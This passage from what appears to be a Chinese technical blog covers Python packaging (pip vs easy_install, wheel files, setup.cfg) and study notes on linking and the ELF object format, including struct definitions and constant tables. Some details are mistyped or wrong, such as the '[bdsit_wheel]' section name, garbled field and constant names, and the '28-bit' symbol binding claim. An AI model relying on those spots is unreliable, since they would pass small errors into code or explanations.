<h4 id="pip-vs-easy-install"><a href="#pip-vs-easy-install" class="headerlink" title="pip vs easy_install"></a>pip vs easy_install</h4><p><code>pip</code>支持<code>git/svn/hg</code>等流行的<code>VCS</code>系统，可以直接从<code>gz</code>或者<code>zip</code>压缩包安装，支持搜索包，以及指定服务器安装等等功能。</p>
<p>那么<code>pip</code>和<code>easy_install</code>的区别</p>
<table>
<thead>
<tr>
<th></th>
<th>pip</th>
<th>easy_install</th>
</tr>
</thead>
<tbody><tr>
<td>Installs from Wheels</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Uninstall Packages</td>
<td>Yes (python -m pip uninstall)</td>
<td>No</td>
</tr>
<tr>
<td>Dependency Overrides</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>List Installed Packages</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>PEP 438 Support</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Installation format</td>
<td>‘Flat’ packages with egg-info metadata.(包含<code>egg-info</code>元数据的包)</td>
<td>Encapsulated Egg format(封装的<code>egg</code>包)</td>
</tr>
<tr>
<td>sys.path modification</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Installs from eggs</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>pylauncher support</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Multi-version Installs</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Exclude scripts during installs</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>per project index</td>
<td>Only in virtualenv</td>
<td>Yes, via setup.cfg</td>
</tr>
</tbody></table>
<p>源自<a class="link"   href="https://packaging.python.org/en/latest/discussions/pip-vs-easy-install/" >此处<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="wheel"><a href="#wheel" class="headerlink" title="wheel"></a>wheel</h3><p><code>wheel</code>本质上是一个<code>zip</code>包格式，于2014年出现，它使用<code>.whl</code>扩展名，用于<code>Python</code>模块安装，是<code>.egg</code>文件的替代品。</p>
<p><code>wheel</code>还提供了一个<code>bdist_wheel</code>作为<code>setuptools</code>的扩展命令，这个命令可以用来生成<code>wheel</code>包。</p>
<p><code>pip</code>提供了一个<code>wheel</code>子命令来安装<code>wheel</code>包。当然，需要先安装<code>wheel</code>模块。</p>
<h4 id="whl使用"><a href="#whl使用" class="headerlink" title="whl使用"></a>whl使用</h4><p>将一个基于<code>setuptools</code>的项目<code>build</code>为<code>.whl</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python setup.py bdist_wheel</span><br></pre></td></tr></table></figure>

<p>我们打包好的<code>.whl</code>会被生成在<code>dist</code>目录下，名为<code>yourproject-&lt;tags&gt;.whl</code></p>
<p>或者制作一个<code>python2/3</code>兼容的纯<code>Python</code>文件，就需要在<code>setup.cfg</code>中添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[bdsit_wheel]</span><br><span class="line">universal &#x3D; 1</span><br></pre></td></tr></table></figure>

<p>一些包转换命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wheel convert youreggfile.egg   #egg转wheel</span><br><span class="line">wheel convert yourinstaller.exe #exe转wheel</span><br></pre></td></tr></table></figure>

<p>如何将我们的<code>license file</code>包含在生成的<code>.wheel</code>文件中呢？</p>
<p>通常我们的项目中会被要求包含一些开源许可证。默认情况下，wheel方便地在<code>.dist-info</code>目录中包含与下列glob模式匹配的文件。</p>
<blockquote>
<p>glob是python自带的一个操作文件的相关模块，由于模块功能比较少，所以很容易掌握。用它可以查找符合特定规则的文件路径名。使用该模块查找文件，只需要用到： “*”, “?”, “[]”这三个匹配符;</p>
</blockquote>
<ul>
<li><code>AUTHORS*</code></li>
<li><code>COPYING*</code></li>
<li><code>LICEN[CS]E*</code></li>
<li><code>NOTICE*</code></li>
</ul>
<p>这些文件我们都可以通过<code>setup.cfg</code>文件中的<code>[metadata]</code>参数来进行重写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[metadata]</span><br><span class="line">license_files &#x3D;</span><br><span class="line">   license.txt</span><br><span class="line">   3rdparty&#x2F;*.txt</span><br></pre></td></tr></table></figure>
<p><a class="link"   href="https://wheel.readthedocs.io/en/latest/#defining-the-python-version" >setup.cfg<i class="fas fa-external-link-alt"></i></a>可以用来定义<code>wheel</code>打包时的相关信息</p>
<h4 id="Egg-vs-Wheel"><a href="#Egg-vs-Wheel" class="headerlink" title="Egg vs Wheel"></a>Egg vs Wheel</h4><ul>
<li>Wheel 有一个官方的 PEP427 来定义，而 Egg 没有 PEP 定义</li>
<li>Wheel 是一种分发格式，即打包格式。而 Egg 既是一种分发格式，也是一种运行时安装的格式，并且是可以被直接 import</li>
<li>Wheel 文件不会包含 .pyc 文件</li>
<li>Wheel 使用和 PEP376 兼容的 .dist-info 目录，而 Egg 使用 .egg-info 目录</li>
<li>Wheel 有着更丰富的命名规则。</li>
<li>Wheel 是有版本的。每个 Wheel 文件都包含 wheel 规范的版本和打包的实现</li>
<li>Wheel 在内部被 sysconfig path type 管理，因此转向其他格式也更容易 </li>
</ul>
<h3 id="distutils2-和-distlib"><a href="#distutils2-和-distlib" class="headerlink" title="distutils2 和 distlib"></a>distutils2 和 distlib</h3><p><code>distutils2</code>被设计为<code>distutils</code>的替代品。从2009年开发到2012年。它包含更多的功能，并希望以<code>packaging</code>作为名称进入<code>python 3.3</code>成为标准库的一部分。但这个计划后来停滞了</p>
<p><code>distlib</code>是<code>distutils2</code>的部分，它为<code>distutils2/packaging</code>提供的低级功能增加高级<code>API</code>，使其便于使用。</p>
<p><a class="link"   href="https://pythonhosted.org/distlib/overview.html" >这里<i class="fas fa-external-link-alt"></i></a>介绍了<code>distlib</code>没有进入<code>python 3.3</code>标准库的一些原因。</p>
<p>因此，可以暂时不必了解这两个工具，静观其变即可。</p>
<p>参考链接：</p>
<ol>
<li><a class="link"   href="https://docs.python.org/3/distutils/sourcedist.html" >https://docs.python.org/3/distutils/sourcedist.html<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://blog.zengrong.net/post/python_packaging/#%E4%BA%8Cpython-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%A4%A7%E4%B9%B1%E6%96%97" >https://blog.zengrong.net/post/python_packaging/#%E4%BA%8Cpython-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%A4%A7%E4%B9%B1%E6%96%97<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://peak.telecommunity.com/DevCenter/PythonEggs" >http://peak.telecommunity.com/DevCenter/PythonEggs<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://peak.telecommunity.com/DevCenter/EasyInstall" >http://peak.telecommunity.com/DevCenter/EasyInstall<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://pyzh.readthedocs.io/en/latest/python-setup-dot-py-vs-requirements-dot-txt.html" >https://pyzh.readthedocs.io/en/latest/python-setup-dot-py-vs-requirements-dot-txt.html<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://packaging.python.org/en/latest/discussions/pip-vs-easy-install/" >https://packaging.python.org/en/latest/discussions/pip-vs-easy-install/<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://wheel.readthedocs.io/en/latest/#defining-the-python-version" >https://wheel.readthedocs.io/en/latest/#defining-the-python-version<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://stackoverflow.com/questions/6344076/differences-between-distribute-distutils-setuptools-and-distutils2/14753678#14753678" >https://stackoverflow.com/questions/6344076/differences-between-distribute-distutils-setuptools-and-distutils2/14753678#14753678<i class="fas fa-external-link-alt"></i></a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>程序员的自我修养——链接、装载与库 笔记</title>
    <url>/2021/08/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E2%80%94%E2%80%94%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="程序员的自我修养——链接、装载与库-笔记"><a href="#程序员的自我修养——链接、装载与库-笔记" class="headerlink" title="程序员的自我修养——链接、装载与库 笔记"></a>程序员的自我修养——链接、装载与库 笔记</h1><h2 id="章一"><a href="#章一" class="headerlink" title="章一"></a>章一</h2><p>系统软件架构：</p>
<ul>
<li>Applications: Web browser, Video Player, Word Processor<br><br>Development Tools: C/C++ Complier, Assembler, Libary Tools<br><br>—————-Operating System API——————-</li>
<li>Runtime Library<br><br>———————-System Call———————–</li>
<li>Operating System Kernel<br><br>———————Hardware Specification——————-</li>
<li>HardWare </li>
</ul>
<p>一些操作系统基础知识，不再赘述</p>
<h2 id="章二"><a href="#章二" class="headerlink" title="章二"></a>章二</h2><h3 id="从编写到运行"><a href="#从编写到运行" class="headerlink" title="从编写到运行"></a>从编写到运行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc hello.c</span><br><span class="line">$ .&#x2F;a.out</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>
<p>简单的命令却包含了预处理(Prepressing)、编译(Complilation)、汇编(Assembly)和链接(Linking)四个过程。</p>
<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p>c源文件和相关的.h头文件编译成.i文件，C++程序和其.hpp头文件则被被编译成.ii。</p>
<p>预编译主要处理源码文件中”#”开始的预编译指令。处理规则如下：</p>
<ul>
<li>删除“#define”，展开所有宏定义</li>
<li>处理所有条件预编译指令，比如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li>
<li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置。该过程递归进行</li>
<li>删除所有的注释”//“和”/**/“</li>
<li>添加行号和文件名标识符，比如#2 “hello.c” 2，便于编译时编译器产生调试用的行号信息以及用于编译时产生编译错误或警告时显示行号</li>
<li>保留所有的#pragma 编译器指令，编译器要使用</li>
</ul>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件。</p>
<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>汇编器根据汇编指令和机器指令的对照便进行翻译，然后输出目标文件（Object File）。</p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>在将一大堆文件链接起来后得到最终的可执行文件。</p>
<h3 id="编译器扮演的角色"><a href="#编译器扮演的角色" class="headerlink" title="编译器扮演的角色"></a>编译器扮演的角色</h3><p>编译过程：扫描、语法分析、语义分析、源代码分析、代码生成和目标代码优化。</p>
<h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p>源代码输入到<em>扫描器（Scanner）</em>,扫描器进行词法分析，使用类似<em>有限状态机（Finite State Machine）</em>的算法，将源码字符分割成一系列<em>记号（Token）</em></p>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">array</span>[index]=(index + <span class="number">4</span>) * (<span class="number">2</span> + <span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>记号</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>array</td>
<td>标识符</td>
</tr>
<tr>
<td>[</td>
<td>左方括号</td>
</tr>
<tr>
<td>index</td>
<td>标识符</td>
</tr>
<tr>
<td>]</td>
<td>右方括号</td>
</tr>
<tr>
<td>=</td>
<td>赋值</td>
</tr>
<tr>
<td>(</td>
<td>左圆括号</td>
</tr>
<tr>
<td>index</td>
<td>标识符</td>
</tr>
<tr>
<td>+</td>
<td>加号</td>
</tr>
<tr>
<td>4</td>
<td>数字</td>
</tr>
<tr>
<td>)</td>
<td>右圆括号</td>
</tr>
<tr>
<td>*</td>
<td>乘号</td>
</tr>
<tr>
<td>(</td>
<td>左圆括号</td>
</tr>
<tr>
<td>2</td>
<td>数字</td>
</tr>
<tr>
<td>+</td>
<td>加号</td>
</tr>
<tr>
<td>6</td>
<td>数字</td>
</tr>
<tr>
<td>)</td>
<td>右圆括号</td>
</tr>
</tbody></table>
<p>记号类别：关键字、标识符、字面量（包含数字、字符串等）和特殊字符（如加号、等号）</p>
<p>识别记号的同时，扫描器也完成其他工作，如将标识符存放到符号表，将数字、字符串常量存放到文字表等。</p>
<h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p><em>语法分析器（Grammar Parser）</em>对记号进行语法分析，从而产生<em>语法树（Syntax Tree）</em>。分析过程采用上下文无关语法 <em>（Context-free Grammer）</em>。</p>
<h4 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h4><p><em>语义分析器（Semantic Analyzer）</em>完成语义分析，仅能完成对*静态语义(Static Semantic)<em>的分析，</em>动态语义(Dynamic Analyzer)*只有在运行期才能确定。</p>
<h4 id="中间语言生成"><a href="#中间语言生成" class="headerlink" title="中间语言生成"></a>中间语言生成</h4><p><em>源码级优化器（Source Code Optimizer）</em>会在源码级别进行优化。源代码优化器将整个语法树转换成<em>中间代码(Intermediate Code)</em> 。下面给出一个优化例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t1 &#x3D; 2 + 6</span><br><span class="line">t2 &#x3D; index + 4</span><br><span class="line">t3 &#x3D; t2 * t1</span><br><span class="line">array[index] &#x3D; t3</span><br></pre></td></tr></table></figure>
<p>优化后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t2 &#x3D; index + 4</span><br><span class="line">t2 &#x3D; t2 * 8</span><br></pre></td></tr></table></figure>

<h4 id="目标代码生成与优化"><a href="#目标代码生成与优化" class="headerlink" title="目标代码生成与优化"></a>目标代码生成与优化</h4><p>编译器后端主要包括*代码生成器(Code Generator)<em>和</em>目标代码优化器(Target Code Optimizer)*。优化方法包括：选择合适的寻址方式、使用位移来代替乘法运算、删除多余的指令等，</p>
<h3 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h3><p>在一个程序被分割成多个模块以后，这些模块之间最后如何组合形成一个单一的程序。模块间如何组合的问题也可以归结为程序间如何通信的问题，在C/C++模块之间的通信方式中，有模块间的函数调用以及模块间的变量访问两种。函数访问需要知道目标函数的地址，变量访问也需要知道目标变量的地址，它们都可以归结为模块间符号的引用这一种方式。而模块间依靠符号来通信恰就是<em>链接</em>。</p>
<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><p>链接过程包括了<em>地址和空间分配（Address and Storage Allocation）</em>、<em>符号决议（Symbol Resolution）</em>和<em>重定位（Relocation）</em>等步骤。</p>
<p>各模块的源代码经过编译器编译后形成<em>目标文件(Object File)<em>，目标文件和</em>库（Library）</em>链接形成最终可执行文件。</p>
<p>由于各模块都是单独编译的，在进行模块间的函数调用时，本模块并不知到调用函数的地址，因此先将指令中的目标地址暂时搁置，等待最后链接的时候由链接器去修正这些指令的目标地址。</p>
<h2 id="章三-目标文件"><a href="#章三-目标文件" class="headerlink" title="章三-目标文件"></a>章三-目标文件</h2><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>流行的<em>可执行文件格式（Executable）</em></p>
<ul>
<li>Windows：PE(Portable Executable)</li>
<li>Linux：ELF(Executable Linkable Format)<br>目标文件就是源代码编译后未进行链接的中间文件，与可执行文件的内容结构相似，与可执行文件格式一起采用一种格式存储</li>
<li>Windows：.obj</li>
<li>Linux: .o<br>同样按照可执行文件格式存储的还有：</li>
<li>动态链接库（DLL Dynamic Linking Library）*</li>
<li>Windows： .dll</li>
<li>Linux: .so</li>
<li>静态链接库（Static Linking Library）*</li>
<li>Windows：.lib</li>
<li>Linux: .a</li>
</ul>
<p>ELF文件格式：</p>
<table>
<thead>
<tr>
<th>ELF文件类型</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>可重定位文件(Relocatable File)</td>
<td>包含代码和数据，可以被用来链接成可执行文件或共享目标文件，静态链接库也可归为这一类</td>
<td>Linux的.o<br>Windows的.obj</td>
</tr>
<tr>
<td>可执行文件(Executable File)</td>
<td>包含可直接执行的程序，比如ELF可执行文件，一般无扩展名</td>
<td>比如: /bin/bash文件<br>Windows的.exe</td>
</tr>
<tr>
<td>共享目标文件(Shared Object File)</td>
<td>包含了代码和数据，可以在以下两种情况下使用，一种是链接器可以使用这种文件跟其他的可重定位文件和共享目标文件链接，产生新的目标文件。第二种是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td>
<td>Linux的.so，如/lib/glibc-2.5.so<br>Windows的DLL</td>
</tr>
<tr>
<td>核心转储文件(Core Dump File)</td>
<td>当进程意外终止时，系统可以将该进程的地址空间内容及终止时的一些其他信息转储到核心转储文件</td>
<td>Linux下的core dump</td>
</tr>
</tbody></table>
<h3 id="目标文件形如"><a href="#目标文件形如" class="headerlink" title="目标文件形如"></a>目标文件形如</h3><p>程序源代码编译后的机器指令经常被放在<strong>代码段(Code Section)<strong>里，代码段常见的名字有”.code”和”.text”；全局变量和局部静态变量数据经常被放在</strong>数据段（Data Section）</strong>，数据段一般被称作”.data”。</p>
<p>文件头描述整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接及入口地址（如果是可执行文件），目标硬件、目标操作系统等信息，文件头还包括一个段表<strong>（Section Table）</strong>，段表其实是描述文件中各个段的数组，描述文件中各个段在文件中的偏移位置及段的属性。</p>
<p>代码的保存位置：</p>
<ul>
<li>.text: C语言编译后的执行语句</li>
<li>.data: 已初始化的全局变量和局部静态变量</li>
<li>.bss: 未初始化的全局变量和局部静态变量</li>
</ul>
<p>ps: 未初始化的全局变量和局部静态变量默认值都为0，换言之他们可以存放在.data段，但因他们都是0，所以为其在.data分配空间并存放数据0并没有必要。.bss段记录所有未初始化的全局变量和局部静态变量的大小总和，为他们预留位置，无内容，也不占据空间。</p>
<p>为什么指令和数据分段？</p>
<blockquote>
<p>程序被装载后，映射到两个虚存位置。数据区域可读写，指令区域对进程来说只读。防止程序指令被改写。</p>
</blockquote>
<blockquote>
<p>对于COU的缓存体系，指令区和数据区分离有利于提高程序局部性，可以提高CPU的缓存命中率。</p>
</blockquote>
<blockquote>
<p>当系统中运行着多个同样程序的副本时，指令相同，内存只需要保存一份该程序的指令部分。同理其他的只读区域和共享区域，节省大量内存。</p>
</blockquote>
<h3 id="ELF文件包含的其他段"><a href="#ELF文件包含的其他段" class="headerlink" title="ELF文件包含的其他段"></a>ELF文件包含的其他段</h3><table>
<thead>
<tr>
<th>常用的段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.rodata1</td>
<td>Read only Data，存放只读数据，比如字符串常量、全局const变量</td>
</tr>
<tr>
<td>.comment</td>
<td>存放的是编译器版本信息，比如字符串：”GCC:(GNU)4.2.0”</td>
</tr>
<tr>
<td>.debug</td>
<td>调试信息</td>
</tr>
<tr>
<td>.dynamic</td>
<td>动态链接信息</td>
</tr>
<tr>
<td>.hash</td>
<td>符号哈希表</td>
</tr>
<tr>
<td>.line</td>
<td>调试时的行号表，即源代码行号与编译后指令的对应表</td>
</tr>
<tr>
<td>.note</td>
<td>额外的编译器信息，比如程序的公司名、发布版本号等</td>
</tr>
<tr>
<td>.strtab</td>
<td>String Table. 字符串表，用于存储ELF文件中用到的各种字符串</td>
</tr>
<tr>
<td>.symtab</td>
<td>Symbol Table. 符号表</td>
</tr>
<tr>
<td>.shstrtab</td>
<td>Section String Table.段名表</td>
</tr>
<tr>
<td>.plt<br>.got</td>
<td>动态链接的跳转表和全局入口表</td>
</tr>
<tr>
<td>.init<br>.fini</td>
<td>程序初始化与终结代码段</td>
</tr>
</tbody></table>
<p>自定义段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__attribute__((section(<span class="string">&quot;FOO&quot;</span>))) <span class="keyword">int</span> global = <span class="number">42</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;BAR))) void foo()&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在全局变量或函数前加上<code>&quot;__attribute__(section(&quot;name))&quot;</code>属性就可以把相应的函数放到以<code>&quot;name&quot;</code>作为段名的段中。</p>
<h3 id="ELF文件结构描述"><a href="#ELF文件结构描述" class="headerlink" title="ELF文件结构描述"></a>ELF文件结构描述</h3><ol>
<li><p>ELF Header<br>包含ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度及段的数量，32位和64位分为<code>&quot;ELF32_Ehdr&quot;</code>和<code>&quot;Elf64_Ehdr&quot;</code></p>
<p> Elf32_Ehdr为例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[<span class="number">16</span>];  <span class="comment">//魔数</span></span><br><span class="line">    Elf32_Half e_type;      <span class="comment">//ELF文件类型</span></span><br><span class="line">    Elf32_Half e_machine;   <span class="comment">//ELF文件的CPU平台属性，相关常量以EM_开头</span></span><br><span class="line">    Elf32_Word e_version;   <span class="comment">//ELF版本号，一般为常熟1</span></span><br><span class="line">    Elf32_Addr e_entry;   <span class="comment">//规定ELF程序的入口虚拟地址，可重定位文件一般没有入口地址，则该值为0.</span></span><br><span class="line">    Elf32_Off e_phoff;    </span><br><span class="line">    Elf32_Off e_shoff;    <span class="comment">//段表在文件中的偏移</span></span><br><span class="line">    Elf32_Half e_flags;   <span class="comment">//ELF标志位，用来标识一些ELF文件平台相关的属性。</span></span><br><span class="line">    Elf32_Half e_ehsize;    <span class="comment">//ELF文件头本身的大小</span></span><br><span class="line">    Elf32_Half e_phentsize;   </span><br><span class="line">    Elf32_Half e_phnum; </span><br><span class="line">    Elf32_Half e_shentsize;   <span class="comment">//段表描述符的大小，一般等于sizeof(Elf32_Shdr)</span></span><br><span class="line">    Elf32_Half e_shnum;   <span class="comment">//段表描述符数量，ELF文件中拥有的段的数量</span></span><br><span class="line">    Elf32_Half e_shstrndx;    <span class="comment">//段表字符串所在的段在段表中的下标</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件类型</p>
</li>
</ol>
<table>
<thead>
<tr>
<th>常量</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ET_REL</td>
<td>1</td>
<td>可重定位文件，一般为.o</td>
</tr>
<tr>
<td>ET_EXEC</td>
<td>2</td>
<td>可执行文件</td>
</tr>
<tr>
<td>ET_DYN</td>
<td>3</td>
<td>共享目标文件，一般为.so</td>
</tr>
</tbody></table>
<p>机器类型<br>|常量|值|含义|<br>|-|-|-|<br>|EM_M32|1|AT&amp;T WE 32100|<br>|EM_SPAREC|2|SPARC|<br>|EM_386|3|Intel x86|<br>|EM_68K|4|Motorola 68000|<br>|EM_88K|5|Motorola 88000|<br>|EM_860|6|Intel 80860|</p>
<ol start="2">
<li>.text</li>
<li>.data</li>
<li>.bss</li>
<li>…</li>
<li>other sections</li>
<li>Section Header table<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word sh_name;   <span class="comment">//段名</span></span><br><span class="line">    Elf32_Word sh_type;   <span class="comment">//段的类型</span></span><br><span class="line">    Elf32_Word sh_flags;  <span class="comment">//段的标志位</span></span><br><span class="line">    Elfs32_Addr sh_addr;  <span class="comment">//段虚拟地址</span></span><br><span class="line">    Elf32_Off sh_offset;  <span class="comment">//段偏移</span></span><br><span class="line">    Elf32_Word sh_size;   <span class="comment">//段长度</span></span><br><span class="line">    Elf32_Word sh_link;   <span class="comment">//段链接信息</span></span><br><span class="line">    Elf32_Word sh_addralign;   <span class="comment">//段地址对齐</span></span><br><span class="line">    Elf32_Word sh_entsize;    <span class="comment">//项的长度</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure>
段的类型：<table>
<thead>
<tr>
<th>常量</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>SHT_NULL</td>
<td>0</td>
<td>无效段</td>
</tr>
<tr>
<td>SHT_PROGBITS</td>
<td>1</td>
<td>程序段、代码段、数据段</td>
</tr>
<tr>
<td>SGT_SYMTAB</td>
<td>2</td>
<td>符号表</td>
</tr>
<tr>
<td>SHT_STRTAB</td>
<td>3</td>
<td>字符串表</td>
</tr>
<tr>
<td>SHT_RELA</td>
<td>4</td>
<td>重定位表</td>
</tr>
<tr>
<td>SHT_HASH</td>
<td>5</td>
<td>符号表的哈希表</td>
</tr>
<tr>
<td>SHT_DYNAMIC</td>
<td>6</td>
<td>动态链接信息</td>
</tr>
<tr>
<td>SHT_NOTE</td>
<td>7</td>
<td>提示性信息</td>
</tr>
<tr>
<td>SHT_NOBITS</td>
<td>8</td>
<td>该段在文件中没内容，如.bss</td>
</tr>
<tr>
<td>SHT_REL</td>
<td>9</td>
<td>重定位信息</td>
</tr>
<tr>
<td>SHT_SHLIB</td>
<td>10</td>
<td>保留</td>
</tr>
<tr>
<td>SHT_DNYSYM</td>
<td>11</td>
<td>动态链接的符号表</td>
</tr>
<tr>
<td>段的标志位：</td>
<td></td>
<td></td>
</tr>
<tr>
<td>常量</td>
<td>值</td>
<td>含义</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>SHF_WRITE</td>
<td>1</td>
<td>可写</td>
</tr>
<tr>
<td>SHF_ALLOC</td>
<td>2</td>
<td>表示该段在进程空间中需要分配空间</td>
</tr>
<tr>
<td>SHF_EXECINSTR</td>
<td>4</td>
<td>表示可执行</td>
</tr>
<tr>
<td>段的链接信息</td>
<td></td>
<td></td>
</tr>
<tr>
<td>sh_type</td>
<td>sh_link</td>
<td>sh_info</td>
</tr>
<tr>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>SHT_DYNAMIC</td>
<td>该段所使用的字符串表在段表中的下标</td>
<td>0</td>
</tr>
<tr>
<td>SHT_HASH</td>
<td>该段所使用的符号表在段表中的下标</td>
<td>0</td>
</tr>
<tr>
<td>SHT_REL</td>
<td>该段所使用的相应符号表在段表中的下表</td>
<td>该重定位表所作用的段在段表中的下标</td>
</tr>
<tr>
<td>SHT_RELA</td>
<td>同上</td>
<td>同上</td>
</tr>
<tr>
<td>SHT_SYMTAB</td>
<td>操作系统相关</td>
<td>操作系统相关</td>
</tr>
<tr>
<td>SHT_DYNSYM</td>
<td>同上</td>
<td>同上</td>
</tr>
<tr>
<td>other</td>
<td>SHN_UNDER</td>
<td>0</td>
</tr>
</tbody></table>
</li>
<li>String Tables<br>Symbol Tables<br>字符串表和段表字符串表，字符串表保存普通字符串，段表字符串保存段表中用到的字符串，如段名。</li>
</ol>
<p>魔数：</p>
<ul>
<li>ELF魔数: 0x7f、0x45、0x4c、0x4，第一个字节时ASCII字符中的DEL控制符，后面三个是ELF三个字母的ASCII码</li>
<li>.out: 0x01、0x07</li>
<li>PE/COFF: 0x4d、0x5a-MZ </li>
</ul>
<h4 id="链接的接口-符号"><a href="#链接的接口-符号" class="headerlink" title="链接的接口-符号"></a>链接的接口-符号</h4><p>函数和变量统称为符号，函数名和变量名统称为符号名。</p>
<p>每一个目标文件都有一个符号表，每个定义的符号有一个对应的值即符号值。<br>符号表结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Elf32_Word st_name;   <span class="comment">//符号名，包含了该符号名在字符串表中的下标</span></span><br><span class="line">  Elf32_Addr st_value;  <span class="comment">//符号对应的值，可能是一个绝对值也可能是地址</span></span><br><span class="line">  Elf32_Word st_size;   <span class="comment">//符号大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_nfo; <span class="comment">//符号类型和绑定的信息</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">//0，没用</span></span><br><span class="line">  Elf32_Half st_shndx;  <span class="comment">//符号所在的段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>符号类型和绑定信息：该成员低4位标识符号的类型，高28位表示符号绑定信息。</p>
<p>符号绑定信息</p>
<table>
<thead>
<tr>
<th>宏定义名</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>STB_LOCAL</td>
<td>0</td>
<td>局部符号</td>
</tr>
<tr>
<td>STB_GLOBAL</td>
<td>1</td>
<td>全局符号</td>
</tr>
<tr>
<td>STB_WEAK</td>
<td>2</td>
<td>弱引用</td>
</tr>
</tbody></table>
<p>符号类型<br>|宏定义名|值|说明|<br>|-|-|-|<br>|STT_NOTYPE|0|未知类型符号|<br>|STT_OBJECT|1|数据对象，如变量，数组|<br>|STT_FUNC|2|函数或其他可执行代码|<br>|STT_SECTION|3|表示一个段，必须是STB_LOCAL的|<br>|STT_FILE|4|表示文件名，一定是STB_LOCAL类型，并且st_shndx一定是SHN_ABS|</p>
